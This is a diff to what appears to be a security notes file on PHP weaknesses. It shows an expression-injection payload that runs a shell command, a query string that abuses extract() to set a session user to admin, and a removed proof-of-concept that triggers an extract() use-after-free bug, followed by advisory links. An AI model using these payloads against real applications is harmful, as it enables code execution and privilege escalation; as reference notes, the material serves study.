@@ -486,29 +486,12 @@ ${Runtime.getRuntime().exec("touch /tmp/pwned")}
 - `extract($_GET);`
     - `.php?_SESSION[name]=admin`
     - `echo $_SESSION['name']` => 'admin'
-  ```
-https://cybersecuritynews.com/php-extract-function-vulnerability/
-https://ssd-disclosure.com/ssd-advisory-extract-double-free5-x-use-after-free7-x-8-x/
-PHP 的 extract() 函数存在严重漏洞
-<?php
 
-// Basic Trigger of the bug without segfaulting - only visible using GDB.
-// b zif_sleep
-// p alloc_globals.mm_heap.cache[2]
+-`https://cybersecuritynews.com/php-extract-function-vulnerability/  `
+-`https://ssd-disclosure.com/ssd-advisory-extract-double-free5-x-use-after-free7-x-8-x/  `
+-`PHP 的 extract() 函数存在严重漏洞  `
 
-class GetFree
-{
-    public function __destruct()
-    {
-        unset($GLOBALS["b"]);
-    }
-}
 
-$b = new GetFree();
-$array = ["b" => "AB"];
-extract($array, EXTR_REFS);
-sleep(0);
-  ```
 
 ## trim
 
